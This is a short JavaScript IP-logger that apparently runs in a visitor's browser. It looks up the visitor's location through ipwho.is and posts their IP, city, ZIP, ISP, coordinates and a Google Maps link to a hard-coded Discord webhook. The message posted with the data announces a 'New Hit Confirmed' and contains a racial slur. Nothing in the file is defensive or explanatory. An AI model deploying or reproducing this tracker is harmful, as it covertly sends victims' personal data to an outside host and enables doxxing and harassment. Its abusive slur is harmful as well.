function getIP(json) {
    var ip_address = json.ip;
    var request = new XMLHttpRequest();
    request.open("GET", `https://ipwho.is/${ip_address}`);
    request.onreadystatechange = function() {
        if (request.readyState === 4 && request.status === 200) {
            var data = JSON.parse(request.responseText);

            if (data.success === false) {
                console.error("IP lookup failed:", data.message);
                return;
            }

            var message = "```\n" +
                          `IP: ${data.ip}\n` +
                          `Country: ${data.country}\n` +
                          `City: ${data.city}\n` +
                          `ZIP: ${data.postal}\n` +
                          `ISP: ${data.connection.isp}\n` +
                          `Lon: ${data.longitude}\n` +
                          `Lat: ${data.latitude}\n` +
                          `Timezone: ${data.timezone.id}\n` +
                          "```\n";

            var params = {
                username: "SPNXY RUNS YOU",
                avatar_url: "https://cdn.discordapp.com/attachments/1040122185114714192/1237240108990857276/551a1ecc2c39cf1cac3f1fe26333f01a.jpg",
                content: "@everyone, **THX FOR THE IP NIGGA** \n **New Hit Confirmed** \n" +
                         `Google Maps: https://www.google.com/maps/?q=${data.latitude},${data.longitude}\n` +
                         message
            };

            sendToWebhook(params);
        }
    };
    request.send();
}

function sendToWebhook(params) {
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1375489614206472283/i78qhceGyFtsIdZXHjsojWIZ1RId_XILPtjjtNCgh8MNAFVV1ou4StXGiEHIy_si8ZwO");
    request.setRequestHeader('Content-type', 'application/json');

    request.onreadystatechange = function() {
        if (request.readyState === 4) {
            console.log('Webhook response:', request.status, request.responseText);
            if (request.status === 204) {
                console.log("✅ Successfully sent to Discord.");
            } else {
                console.error("❌ Failed to send to Discord:", request.responseText);
            }
        }
    };

    request.send(JSON.stringify(params));
}
